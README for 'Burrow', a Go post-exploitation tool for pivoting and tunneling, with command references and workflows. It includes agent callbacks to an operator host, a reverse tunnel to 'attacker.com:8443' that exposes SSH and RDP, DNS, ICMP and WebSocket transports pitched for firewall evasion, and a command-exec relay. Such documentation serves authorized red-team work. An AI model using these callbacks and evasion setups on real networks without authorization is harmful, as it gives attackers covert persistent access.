# Burrow v3.0.0

Multi-transport network pivoting and tunneling tool for post-exploitation network traversal. Static Go binary.

## Overview

Burrow is a static Go binary built for post-exploitation network traversal. v3 introduces a pluggable transport architecture: any tunnel (SOCKS5, relay, pivot chain) runs over any transport (Raw TCP/TLS, WebSocket, DNS, ICMP). The agent/server model uses multiplexed yamux sessions over the control channel, letting a single connection carry multiple concurrent tunnels and control messages.

Non-root mode routes sessions through SOCKS5. Root mode uses a TUN interface backed by gvisor's userspace netstack for full IP-level routing without kernel module dependencies.

All traffic is encrypted: X25519 key exchange, HKDF-SHA256 key derivation, ChaCha20-Poly1305 or AES-256-GCM AEAD per frame. Agent connections use TLS with certificate fingerprint verification so agents can confirm they're talking to the right server without a CA chain.

A WebUI dashboard is available for session management via browser or REST API. A Python companion package provides MCP server integration and a FastAPI web dashboard.

## Install / Build

Requires Go 1.24+.

```bash
# Build for current platform
make build          # -> build/burrow

# Cross-compile all platforms
make build-all
```

Pre-compiled binaries are in `build/`:

| File | Platform |
|------|----------|
| `build/burrow-linux-amd64` | Linux x86_64 |
| `build/burrow-linux-arm64` | Linux ARM64 |
| `build/burrow-windows-amd64.exe` | Windows x86_64 |
| `build/burrow-darwin-amd64` | macOS Intel |
| `build/burrow-darwin-arm64` | macOS Apple Silicon |

## Transports

Select transport with `--transport <name>` on both server and agent. Both sides must use the same transport.

| Transport | Flag | Description | When to Use |
|-----------|------|-------------|-------------|
| Raw TCP/TLS | `raw` (default) | Direct TCP with TLS. Auto-generated Ed25519 self-signed certs. Fingerprint verification on agent side. | Default. Fast, reliable. Use when the network allows direct TCP. |
| WebSocket | `ws` | HTTP/HTTPS upgrade protocol. | Firewall evasion. Traffic looks like normal HTTPS. |
| DNS tunnel | `dns` | Encodes traffic in DNS queries/responses. | Restrictive networks where only DNS egress is allowed. |
| ICMP tunnel | `icmp` | Encodes traffic in ICMP echo payloads. | Networks where only ping is allowed. Requires raw socket privileges. |

## Commands Reference

### `burrow server`

Start the proxy server that accepts agent connections.

On startup, the server generates a self-signed Ed25519 TLS certificate and prints its SHA256 fingerprint. Pass this fingerprint to agents with `--fingerprint` so they can verify the server's identity.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--listen, -l` | `0.0.0.0:11601` | Listen address for agent connections |
| `--cert` | | Path to TLS certificate PEM file (overrides auto-generated cert) |
| `--key` | | Path to TLS private key PEM file |
| `--no-tls` | | Disable TLS (plaintext connections) |
| `--transport, -t` | `raw` | Transport protocol: `raw`, `ws`, `dns`, `icmp` |
| `--webui` | | Enable WebUI dashboard |
| `--webui-addr` | `127.0.0.1:8080` | WebUI listen address |

**Examples:**

```bash
# Raw TCP with auto-TLS (default)
burrow server

# Custom listen address
burrow server --listen 0.0.0.0:443

# WebSocket transport with WebUI
burrow server --transport ws --listen 0.0.0.0:443 --webui

# DNS tunnel
burrow server --transport dns --listen 0.0.0.0:53

# ICMP tunnel
burrow server --transport icmp --listen 0.0.0.0:0

# Custom TLS certificate
burrow server --cert /path/to/cert.pem --key /path/to/key.pem

# WebUI on custom address
burrow server --webui --webui-addr 0.0.0.0:9090
```

**Expected output:**

```
[*] TLS fingerprint: SHA256:a3f2c1...
[*] Listening on 0.0.0.0:11601 (transport: raw)
[+] Agent connected: session-abc123 (hostname: target01, OS: linux, IPs: [10.0.0.5])
[-] Agent disconnected: session-abc123
```

---

### `burrow agent`

Connect back to a proxy server. The agent sends a handshake containing hostname, OS, IP addresses, PID, and version. The server assigns a session ID and the agent waits for commands: tunnel requests, route management, listener requests.

The agent auto-reconnects on disconnect. Use `--retry` to cap reconnection attempts.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--connect, -c` | (required) | Server address to connect to (`host:port`) |
| `--fingerprint` | | Expected server TLS fingerprint (SHA256). Format: `SHA256:hex...` |
| `--retry` | `0` | Max reconnection attempts. `0` means infinite. |
| `--transport, -t` | `raw` | Transport protocol: `raw`, `ws`, `dns`, `icmp` |
| `--no-tls` | | Connect without TLS |

**Examples:**

```bash
# Basic connection
burrow agent --connect 10.0.0.1:11601

# With fingerprint verification (recommended)
burrow agent -c 10.0.0.1:11601 --fingerprint SHA256:a3f2c1...

# WebSocket transport
burrow agent --connect 10.0.0.1:443 --transport ws

# DNS tunnel
burrow agent --connect 10.0.0.1:53 --transport dns

# ICMP tunnel
burrow agent --connect 10.0.0.1:0 --transport icmp

# Limit reconnection attempts
burrow agent -c 10.0.0.1:11601 --retry 5
```

**Expected output:**

```
[*] Connecting to 10.0.0.1:11601 (transport: raw)
[*] TLS fingerprint verified: SHA256:a3f2c1...
[+] Session established: session-abc123
[*] Waiting for commands...
```

On disconnect, the agent sleeps and retries. With `--retry 0`, it retries indefinitely.

---

### `burrow session list`

List all active agent sessions. Queries the WebUI REST API at `/api/sessions`. The server must be running with `--webui`.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--webui-addr` | `127.0.0.1:8080` | WebUI server address |

**Example:**

```bash
burrow session list
burrow session list --webui-addr 127.0.0.1:9090
```

**Expected output:**

```
ID               HOSTNAME    OS      IPs              CREATED
session-abc123   target01    linux   10.0.0.5         2024-01-15 14:32:01
session-def456   winbox      windows 192.168.1.20     2024-01-15 14:45:12
```

---

### `burrow session info <session-id>`

Show detailed information about a specific session, including active tunnels and routes.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--webui-addr` | `127.0.0.1:8080` | WebUI server address |

**Example:**

```bash
burrow session info session-abc123
```

**Expected output:**

```
Session: session-abc123
  Hostname:  target01
  OS:        linux
  IPs:       10.0.0.5, 172.16.0.1
  Status:    connected
  Created:   2024-01-15 14:32:01

Tunnels:
  ID          DIRECTION  LISTEN              REMOTE           PROTOCOL  STATUS
  tun-001     local      127.0.0.1:8080      10.0.0.5:80      tcp       active
  tun-002     remote     0.0.0.0:9090        192.168.1.10:22  tcp       active

Routes:
  CIDR            STATUS
  10.0.0.0/24     active
  192.168.1.0/24  active
```

---

### `burrow session use <session-id>`

Enter an interactive REPL for managing a specific session. The prompt is `burrow> `.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--webui-addr` | `127.0.0.1:8080` | WebUI server address |

**Example:**

```bash
burrow session use session-abc123
```

**Interactive commands:**

| Command | Description |
|---------|-------------|
| `info` | Show session details |
| `tunnels` | List active tunnels |
| `routes` | List active routes |
| `tunnel add <direction> <listen> <remote> [protocol]` | Create a tunnel. Direction: `local`, `remote`, or `reverse`. Protocol defaults to `tcp`. |
| `tunnel rm <tunnel-id>` | Remove a tunnel |
| `route add <cidr>` | Add a network route |
| `route rm <cidr>` | Remove a network route |
| `help` | Show available commands |
| `exit` | Exit the REPL |

**Example session:**

```
burrow session use session-abc123
Connected to session-abc123 (target01 / linux)

burrow> info
Session: session-abc123
  Hostname: target01
  ...

burrow> tunnel add local 127.0.0.1:8080 10.0.0.5:80
[+] Tunnel created: tun-001

burrow> tunnel add remote 0.0.0.0:9090 192.168.1.10:22
[+] Tunnel created: tun-002

burrow> route add 10.0.0.0/24
[+] Route added: 10.0.0.0/24

burrow> tunnels
ID          DIRECTION  LISTEN              REMOTE           PROTOCOL  STATUS
tun-001     local      127.0.0.1:8080      10.0.0.5:80      tcp       active
tun-002     remote     0.0.0.0:9090        192.168.1.10:22  tcp       active

burrow> tunnel rm tun-001
[+] Tunnel removed: tun-001

burrow> route rm 10.0.0.0/24
[+] Route removed: 10.0.0.0/24

burrow> exit
```

---

### `burrow proxy socks5`

Start a SOCKS5 proxy server (RFC 1928). Supports the CONNECT method. Useful for routing arbitrary TCP traffic through an agent session without setting up explicit port forwards.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--listen, -l` | `127.0.0.1:1080` | Listen address |
| `--auth` | | Authentication credentials as `user:pass` |

**Examples:**

```bash
# Basic SOCKS5 proxy
burrow proxy socks5

# Custom listen address
burrow proxy socks5 --listen 0.0.0.0:9050

# With authentication
burrow proxy socks5 --listen 127.0.0.1:1080 --auth operator:s3cr3t
```

**Expected output:**

```
[*] SOCKS5 proxy listening on 127.0.0.1:1080
[+] Connection: 127.0.0.1:54321 -> 10.0.0.5:80 (142 bytes transferred)
[*] Shutting down. Total connections: 3, bytes transferred: 48291
```

Configure tools to use the proxy:

```bash
curl --socks5 127.0.0.1:1080 http://10.0.0.5/
proxychains nmap -sT 10.0.0.0/24
```

---

### `burrow tunnel local`

Local port forward. Listens on a local address and forwards TCP connections to a remote target. Equivalent to `ssh -L`.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--listen, -l` | `127.0.0.1:8080` | Local listen address |
| `--remote, -r` | (required) | Remote target address (`host:port`) |

**Examples:**

```bash
# Forward local 8080 to internal web server
burrow tunnel local --listen 127.0.0.1:8080 --remote 10.0.0.5:80

# Forward local 5432 to internal Postgres
burrow tunnel local --listen 127.0.0.1:5432 --remote db.internal:5432

# Listen on all interfaces
burrow tunnel local --listen 0.0.0.0:8080 --remote 10.0.0.5:80
```

**Expected output:**

```
[*] Local forward: 127.0.0.1:8080 -> 10.0.0.5:80
[+] Connection from 127.0.0.1:54321: 8192 bytes transferred
[*] Shutting down.
```

---

### `burrow tunnel remote`

Remote port forward. Listens on the given address and forwards connections to a target. Equivalent to `ssh -R`.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--listen, -l` | `0.0.0.0:9090` | Listen address |
| `--remote, -r` | (required) | Target address (`host:port`) |

**Examples:**

```bash
# Expose internal SSH on port 9090
burrow tunnel remote --listen 0.0.0.0:9090 --remote 192.168.1.10:22

# Custom listen address
burrow tunnel remote --listen 127.0.0.1:3306 --remote db.internal:3306
```

**Expected output:**

```
[*] Remote forward: 0.0.0.0:9090 -> 192.168.1.10:22
[+] Connection from 10.0.0.1:41234: 4096 bytes transferred
```

---

### `burrow tunnel reverse`

Reverse tunnel with automatic reconnection. The agent side connects out to a controller address, and the controller forwards connections to a local target. Useful when the target can't accept inbound connections.

Uses exponential backoff for reconnection and sends keepalive heartbeats to detect dead connections.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--agent-addr` | `0.0.0.0:8443` | Agent/controller address to connect to |
| `--local-target` | `127.0.0.1:22` | Local target to forward connections to |
| `--max-retries` | `10` | Max reconnection attempts before giving up |

**Examples:**

```bash
# Reverse tunnel for SSH access
burrow tunnel reverse --agent-addr attacker.com:8443 --local-target 127.0.0.1:22

# Reverse tunnel for RDP
burrow tunnel reverse --agent-addr 10.0.0.1:8443 --local-target 127.0.0.1:3389 --max-retries 20
```

**Expected output:**

```
[*] Reverse tunnel: connecting to attacker.com:8443
[*] Forwarding to 127.0.0.1:22
[+] Connected. Waiting for connections...
[-] Connection lost. Retrying in 2s (attempt 1/10)
[+] Reconnected.
```

---

### `burrow pivot`

Multi-hop pivot chain. Connects through a sequence of intermediate hosts to reach a final target. Each hop is a `host:port` pair. Use `--local-port` to open a local listener that routes through the full chain.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--target, -t` | (required) | Final target host |
| `--port, -p` | `8443` | Final target port |
| `--hop` | | Intermediate hop (`host:port`). Repeatable for multi-hop chains. |
| `--local-port` | `0` | Open a local listener on this port. `0` disables the listener. |

**Examples:**

```bash
# Single hop
burrow pivot --target final.host --port 443 --hop hop1:22

# Multi-hop chain
burrow pivot --target final.host --port 443 --hop hop1:22 --hop hop2:443

# With local listener for proxying
burrow pivot --target final.host --port 443 --hop hop1:22 --hop hop2:443 --local-port 1080
```

**Expected output:**

```
[*] Pivot chain:
    local -> hop1:22 -> hop2:443 -> final.host:443
[*] Latency: hop1=12ms, hop2=34ms, final=67ms
[*] Local listener: 127.0.0.1:1080
[+] Ready.
```

---

### `burrow scan`

Network discovery combining ping sweep and port scan. Scans a subnet for reachable hosts and open ports. Marks hosts reachable via pivot with `[PIVOT]`.

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--subnet, -s` | (required) | Subnet to scan (CIDR notation, e.g. `10.0.0.0/24`) |
| `--ports, -p` | top 20 common ports | Comma-separated list of ports to scan |
| `--timeout` | `2s` | Per-port connection timeout |
| `--concurrency, -c` | `256` | Max concurrent connections |

**Examples:**

```bash
# Scan a /24 with default ports
burrow scan --subnet 10.0.0.0/24

# Scan specific ports
burrow scan --subnet 192.168.1.0/24 --ports 22,80,443,3306,5432,8080

# Slower scan with lower concurrency
burrow scan --subnet 10.0.0.0/16 --timeout 5s --concurrency 64
```

**Expected output:**

```
[*] Scanning 10.0.0.0/24 (256 hosts, ports: 22,80,443,3306,8080)

10.0.0.5    [PIVOT]
  22/tcp    open   ssh
  80/tcp    open   http
  443/tcp   open   https

10.0.0.20
  22/tcp    open   ssh
  3306/tcp  open   mysql

[*] Done. 2 hosts up, 5 open ports. (4.2s)
```

---

### `burrow relay`

Socat-style bidirectional relay. Takes two endpoint specs and relays data between them. Useful for bridging protocols, exposing Unix sockets over TCP, or piping commands.

**Usage:**

```bash
burrow relay [--tls] <source-spec> <dest-spec>
```

**Flags:**

| Flag | Description |
|------|-------------|
| `--tls` | Wrap connections in TLS |

**Endpoint spec types:**

| Spec | Description |
|------|-------------|
| `tcp-listen:<port>` | Listen on all interfaces, given port |
| `tcp-listen:<host>:<port>` | Listen on specific address |
| `tcp-connect:<host>:<port>` | Connect to host:port |
| `udp-listen:<port>` | UDP listener |
| `udp-listen:<host>:<port>` | UDP listener on specific address |
| `udp-connect:<host>:<port>` | UDP connect |
| `unix-listen:<path>` | Listen on Unix domain socket |
| `unix-connect:<path>` | Connect to Unix domain socket |
| `exec:<command>` | Execute command, relay stdio |
| `stdio` | Standard input/output |

**Examples:**

```bash
# TCP relay: expose internal service on external port
burrow relay tcp-listen:8080 tcp-connect:10.0.0.5:80

# Unix socket to TCP
burrow relay unix-listen:/tmp/relay.sock tcp-connect:10.0.0.5:22

# Pipe command output over TCP
burrow relay stdio tcp-connect:10.0.0.1:4444

# TLS-wrapped relay
burrow relay --tls tcp-listen:443 tcp-connect:127.0.0.1:8080

# UDP relay
burrow relay udp-listen:5353 udp-connect:8.8.8.8:53
```

**Expected output:**

```
[*] Relay: tcp-listen:8080 <-> tcp-connect:10.0.0.5:80
[+] Connection from 127.0.0.1:54321: relaying...
[*] Bytes: 4096 -> 8192
```

---

## Typical Workflows

### Agent-Based Tunneling

```bash
# Operator: start server with WebUI
burrow server --webui
# Note the fingerprint printed on startup

# Target machine: run agent
burrow agent --connect OPERATOR_IP:11601 --fingerprint SHA256:a3f2c1...

# Operator: list sessions
burrow session list --webui-addr 127.0.0.1:8080

# Operator: manage a session interactively
burrow session use SESSION_ID

burrow> tunnel add local 127.0.0.1:8080 10.0.0.5:80
burrow> route add 10.0.0.0/24
burrow> tunnels
burrow> exit
```

### Standalone Port Forwarding

```bash
# No agent needed. Forward local port to internal host.
burrow tunnel local --listen 127.0.0.1:8080 --remote internal.host:80
```

### Pivot Chain Through Multiple Hosts

```bash
# Chain through two intermediate hops to reach final target
# Opens local port 1080 as entry point
burrow pivot --target final.host --port 443 --hop hop1:22 --hop hop2:443 --local-port 1080
```

### Firewall Evasion with WebSocket Transport

```bash
# Operator: listen on 443 with WebSocket transport
burrow server --transport ws --listen 0.0.0.0:443 --webui

# Target: connect back using WebSocket
burrow agent --connect operator.com:443 --transport ws --fingerprint SHA256:a3f2c1...
```

### DNS Tunnel Through Restrictive Network

```bash
# Operator: DNS tunnel server on port 53
burrow server --transport dns --listen 0.0.0.0:53

# Target: connect via DNS
burrow agent --connect operator.com:53 --transport dns
```

### SOCKS5 Proxy for Tool Routing

```bash
# Start SOCKS5 proxy
burrow proxy socks5 --listen 127.0.0.1:1080

# Route tools through it
curl --socks5 127.0.0.1:1080 http://10.0.0.5/admin
proxychains nmap -sT -p 22,80,443 10.0.0.0/24
```

---

## WebUI Dashboard

Enabled with `--webui` on the server. Accessible at `http://127.0.0.1:8080` by default (or the address set with `--webui-addr`).

Built with Alpine.js and Pico CSS. Provides a live session list, tunnel management, and route management. The `GET /api/events` endpoint is a Server-Sent Events stream for live updates.

### REST API

All endpoints return JSON.

| Method | Path | Description |
|--------|------|-------------|
| `GET` | `/api/sessions` | List all sessions |
| `GET` | `/api/sessions/{id}` | Get session details |
| `GET` | `/api/sessions/{id}/tunnels` | List tunnels for session |
| `POST` | `/api/sessions/{id}/tunnels` | Create tunnel |
| `DELETE` | `/api/sessions/{id}/tunnels/{tid}` | Remove tunnel |
| `GET` | `/api/sessions/{id}/routes` | List routes for session |
| `POST` | `/api/sessions/{id}/routes` | Add route |
| `DELETE` | `/api/sessions/{id}/routes/{cidr}` | Remove route |
| `GET` | `/api/events` | SSE event stream for live updates |

**Create tunnel (POST body):**

```json
{
  "direction": "local",
  "listen": "127.0.0.1:8080",
  "remote": "10.0.0.5:80",
  "protocol": "tcp"
}
```

**Add route (POST body):**

```json
{
  "cidr": "10.0.0.0/24"
}
```

**Example curl usage:**

```bash
# List sessions
curl http://127.0.0.1:8080/api/sessions

# Create a tunnel
curl -X POST http://127.0.0.1:8080/api/sessions/session-abc123/tunnels \
  -H 'Content-Type: application/json' \
  -d '{"direction":"local","listen":"127.0.0.1:8080","remote":"10.0.0.5:80","protocol":"tcp"}'

# Add a route
curl -X POST http://127.0.0.1:8080/api/sessions/session-abc123/routes \
  -H 'Content-Type: application/json' \
  -d '{"cidr":"10.0.0.0/24"}'

# Remove a tunnel
curl -X DELETE http://127.0.0.1:8080/api/sessions/session-abc123/tunnels/tun-001

# Subscribe to live events
curl http://127.0.0.1:8080/api/events
```

---

## Security Model

**TLS:** The server auto-generates a self-signed Ed25519 certificate on startup. The SHA256 fingerprint of the certificate DER is printed to stdout. Pass this to agents with `--fingerprint SHA256:...` so they can verify the server's identity without a CA chain.

**Frame encryption:** Each frame is encrypted independently using X25519 ECDH key exchange, HKDF-SHA256 key derivation, and ChaCha20-Poly1305 or AES-256-GCM AEAD. A 4-byte counter provides anti-replay protection. Keys rotate hourly.

**WebSocket mode:** TLS over HTTPS. Traffic is indistinguishable from normal HTTPS to network observers.

**No plaintext fallback:** Unless `--no-tls` is explicitly passed, all connections use TLS. Fingerprint verification is opt-in but strongly recommended.

---

## Python Companion

The Python package provides a CLI, MCP server integration, and a FastAPI web dashboard that complements the Go WebUI.

```bash
# Install from project root
pip install -e .
```

This installs:
- `burrow` CLI command (via click)
- `burrow.mcp_server` module for MCP integration
- `burrow.web` FastAPI dashboard (complementary to Go WebUI)

Dependencies: click, rich, pyyaml, pydantic, cryptography, fastapi, uvicorn.

---

## Architecture

```
cmd/burrow/cmd/          CLI (cobra)
internal/
  transport/             Transport interface + registry (raw, ws, dns, icmp)
  crypto/                X25519 ECDH + ChaCha20-Poly1305/AES-256-GCM
  proxy/                 SOCKS5 server (RFC 1928) + session routing
  tunnel/                Local, remote, and reverse TCP forwarders
  relay/                 Socat-style bidirectional relay
  pivot/                 Multi-hop chain orchestration
  discovery/             Ping sweep + port scanner
  certgen/               Self-signed TLS cert generation (Ed25519) + fingerprint
  mux/                   yamux stream multiplexer for agent sessions
  protocol/              Binary message protocol (12 types, JSON payloads)
  session/               Agent session manager + proxy server + web.SessionProvider
  tun/                   TUN interface with magic IP 240.0.0.0/4 routing
  netstack/              gvisor userspace TCP/IP for agent-side packet termination
  udp/                   UDP port forwarder
  web/                   Embedded WebUI (Alpine.js + Pico CSS) with REST API + SSE
```

---

## Protocol Reference

Binary frame format:

```
[type: 1 byte][length: 4 bytes big-endian][payload: length bytes]
```

Max payload: 1 MB. All structured payloads are JSON-encoded.

| Type | Hex | Direction | Description |
|------|-----|-----------|-------------|
| Handshake | `0x01` | Agent -> Server | Agent identification: hostname, OS, IPs, PID, version |
| HandshakeAck | `0x02` | Server -> Agent | Session ID assignment |
| TunnelRequest | `0x10` | Server -> Agent | Create a tunnel |
| TunnelAck | `0x11` | Agent -> Server | Tunnel creation result |
| TunnelClose | `0x12` | Either | Close a tunnel |
| RouteAdd | `0x20` | Server -> Agent | Add a network route |
| RouteRemove | `0x21` | Server -> Agent | Remove a network route |
| ListenerRequest | `0x30` | Server -> Agent | Create a listener |
| ListenerAck | `0x31` | Agent -> Server | Listener creation result |
| Ping | `0x40` | Server -> Agent | Keepalive request |
| Pong | `0x41` | Agent -> Server | Keepalive response |
| Error | `0xFF` | Either | Error message |

---

## Testing

```bash
~/go1.24/go/bin/go test ./...
```

20 packages, all passing.

---

## Tech Stack

| Package | Purpose |
|---------|---------|
| Go 1.24+ | Runtime |
| github.com/spf13/cobra | CLI framework |
| golang.org/x/crypto | X25519, ChaCha20-Poly1305, HKDF |
| github.com/hashicorp/yamux | Stream multiplexing for agent sessions |
| nhooyr.io/websocket | WebSocket transport |
| github.com/songgao/water | TUN interface |
| github.com/nicocha30/gvisor-ligolo | Userspace TCP/IP netstack |
| Module: github.com/loudmumble/burrow | |
